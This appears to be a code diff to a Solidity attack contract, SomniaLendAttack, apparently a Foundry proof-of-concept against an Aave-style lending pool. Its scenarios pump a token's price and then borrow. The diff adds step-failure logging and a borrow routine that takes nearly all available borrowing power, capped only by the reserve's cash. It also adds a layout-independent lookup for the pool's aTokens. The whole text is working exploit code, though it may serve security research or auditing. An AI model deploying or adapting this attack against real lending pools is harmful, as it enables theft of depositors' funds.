@@ -12,6 +12,7 @@ import {
     IWrappedNative,
     ReserveData,
     SomniaConfig,
+    Step,
     SomniaMetrics
 } from "./Interfaces.sol";
 
@@ -180,10 +181,12 @@ contract SomniaLendAttack {
             _stage("control-same-tx");
         } else if (mode == Mode.SOMI_PUMP_SUPPLY) {
             try this.step() {} catch (bytes memory inner) {
+                _recordStepFailure(Step.NODE_LIMIT, inner);
                 revert Aborted(abi.encode(m), inner);
             }
         } else if (mode == Mode.USDSO_PUMP_SUPPLY) {
             try this.step() {} catch (bytes memory inner) {
+                _recordStepFailure(Step.NODE_LIMIT, inner);
                 revert Aborted(abi.encode(m), inner);
             }
         } else {
@@ -462,16 +465,82 @@ contract SomniaLendAttack {
         uint256 budget = availableBase - (availableBase / 1_000_000) - 1;
         budget = (budget * params.borrowBps) / BPS;
         uint256 amount = (budget * (10 ** IERC20(asset).decimals())) / price;
-        ReserveData memory reserve = ISomniaLendPool(POOL).getReserveData(asset);
-        uint256 cash = IERC20(asset).balanceOf(reserve.aTokenAddress);
-        if (amount > cash) amount = cash;
+        (address aToken, bool known) = _aTokenOf(asset);
+        if (known) {
+            uint256 cash = IERC20(asset).balanceOf(aToken);
+            if (amount > cash) amount = cash;
+            console2.log("  aToken cash", cash);
+        } else {
+            // Unknown wrapper: do not clamp. The reserve itself rejects an over-borrow, and the
+            // step is isolated, so the worst case is a recorded failure rather than a silent skip.
+            console2.log("  aToken unknown, not clamping");
+        }
         console2.log("borrow candidate asset", asset);
         console2.log("  amount", amount);
-        console2.log("  aToken cash", cash);
         emit Borrowed(asset, amount, availableBase);
         if (amount == 0) return;
+        try this.borrowStep(asset, amount) {
+            borrowed[asset] += amount;
+        } catch (bytes memory inner) {
+            _recordStepFailure(Step.BORROW, inner);
+        }
+    }
+
+    /// @dev Separate external function so a borrow that the reserve rejects is recorded per asset
+    ///      instead of aborting the whole scenario.
+    function borrowStep(address asset, uint256 amount) external {
+        if (msg.sender != address(this)) revert NotSelf();
         ISomniaLendPool(POOL).borrow(asset, amount, VARIABLE_DEBT, 0, address(this));
-        borrowed[asset] += amount;
+    }
+
+    function _recordStepFailure(uint16 step, bytes memory inner) internal {
+        m.stepFailures += 1;
+        m.lastErrorStep = step;
+        m.lastErrorSelector = _selector(inner);
+        console2.log("STEP FAILED", step);
+        console2.log("  selector", uint32(m.lastErrorSelector));
+    }
+
+    function _selector(bytes memory inner) internal pure returns (bytes4 sel) {
+        if (inner.length < 4) return bytes4(0);
+        assembly {
+            sel := mload(add(inner, 32))
+        }
+    }
+
+    /// @dev Locates the aToken for a reserve without trusting a struct layout that may differ from
+    ///      the deployed Aave version. Two independent routes, each self-validated by asking the
+    ///      candidate `UNDERLYING_ASSET_ADDRESS()`: whatever we return provably belongs to `asset`.
+    function _aTokenOf(address asset) internal view returns (address, bool) {
+        (bool ok, bytes memory data) = POOL.staticcall(abi.encodeWithSignature("getReserveAToken(address)", asset));
+        if (ok && data.length >= 32) {
+            address candidate = abi.decode(data, (address));
+            if (_underlyingOf(candidate) == asset) return (candidate, true);
+        }
+
+        (ok, data) = POOL.staticcall(abi.encodeWithSignature("getReserveData(address)", asset));
+        if (ok && data.length >= 32) {
+            // Every address in the tuple is word-aligned; accept the first word that proves it
+            // wraps this exact underlying. No offset is assumed, so a layout change cannot
+            // silently hand back the wrong token.
+            for (uint256 i; i + 32 <= data.length; i += 32) {
+                address candidate = address(uint160(uint256(_word(data, i))));
+                if (_underlyingOf(candidate) == asset) return (candidate, true);
+            }
+        }
+        return (address(0), false);
+    }
+
+    function _underlyingOf(address token) internal view returns (address underlying) {
+        if (token == address(0) || token.code.length == 0) return address(0);
+        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("UNDERLYING_ASSET_ADDRESS()"));
+        if (ok && data.length >= 32) underlying = abi.decode(data, (address));
+    }
+
+    function _word(bytes memory data, uint256 offset) internal pure returns (uint256 out) {
+        assembly {
+            out := mload(add(add(data, 32), offset))
+        }
     }
 
     function _recordBorrows() internal {
